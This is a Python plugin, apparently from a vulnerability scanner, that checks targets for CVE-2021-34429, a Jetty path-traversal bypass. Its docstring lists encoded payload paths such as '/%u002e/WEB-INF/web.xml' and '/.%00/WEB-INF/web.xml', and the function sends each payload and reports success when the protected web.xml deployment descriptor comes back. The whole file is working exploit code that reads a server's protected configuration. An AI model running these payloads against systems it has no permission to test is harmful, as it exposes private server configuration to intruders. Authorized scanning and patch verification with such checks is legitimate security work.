#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2021_34429_scan(self, url):
    ''' CVE-2021-28164的变种和绕过
            基于 Unicode 的 URL 编码     /%u002e/WEB-INF/web.xml
            \0和 .                      /.%00/WEB-INF/web.xml
            \0和 ..                     /a/b/..%00/WEB-INF/web.xml
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'DSinfo'
    vul_info['vul_id'] = 'CVE-2021-34429'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_34429_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            req = requests.Request(
                method='GET',
                url=target,
                headers=self.headers
            ).prepare()

            req.url = target
            session = requests.session()

            res = session.send(
                req,
                timeout=self.timeout,
                proxies=self.proxies,
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (('<web-app>' in res.text)
                and ('<display-name>' in res.text)
                and ('<!DOCTYPE web-app PUBLIC' in res.text)
                and ('Sun Microsystems' in res.text)
                and ('DTD Web Application' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res                  # * 会输出一个http数据包
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
